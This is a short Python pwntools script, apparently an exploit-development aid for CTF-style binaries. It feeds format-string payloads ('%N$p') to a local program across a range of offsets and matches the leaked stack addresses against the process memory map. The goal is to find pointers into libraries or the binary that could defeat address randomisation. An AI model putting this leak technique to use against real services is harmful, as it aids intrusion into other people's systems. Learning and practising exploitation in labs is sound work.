from pwn import *
import sys

global exe

def conn() -> pwnlib.tubes.process.process:
	with context.local(log_level='warn'):
		r = process(exe.path)
		return r

def close(r: pwnlib.tubes.process.process):
	with context.local(log_level='error'):
		r.close()

def leakStack(offset: int) -> bytes:
	return f"%{offset}$p".encode('utf-8')

def findInteresting(maps: list, address: bytes, index: int):
	if b"(nil)" in address:
		return
	addr = int(address,16)
	isInteresting = False
	for section in maps:
		start = section.start
		end = section.end
		perms = section.perms.string
		path = section.path
		if addr >= start and addr <= end:
			if "[anon]" in path:
				continue
			if not isInteresting:
				print(f"[{index}] {hex(addr)}:")
				isInteresting = True
			print(f"\t{path}")

def main(start: int, stop: int):
	for i in range(start, stop):
		r = conn()

		r.recvuntil(b'\n')

		maps = r.maps()

		r.sendline(leakStack(i))
		r.recvuntil(b'> ')
		findInteresting(maps, r.recvline(), i)
		close(r)

if __name__ == "__main__":
	if len(sys.argv) < 4:
		print("Usage: v2.py [start] [stop] [executable]", file=sys.stderr)
		exit(1)
	start = int(sys.argv[1])
	stop = int(sys.argv[2])
	if start < 1 or stop < start:
		print("Invalid start-stop bounds", file=sys.stderr)
		exit(2)
	context.log_level = 'error'
	exe = ELF(sys.argv[3], checksec=False)
	main(start,stop)
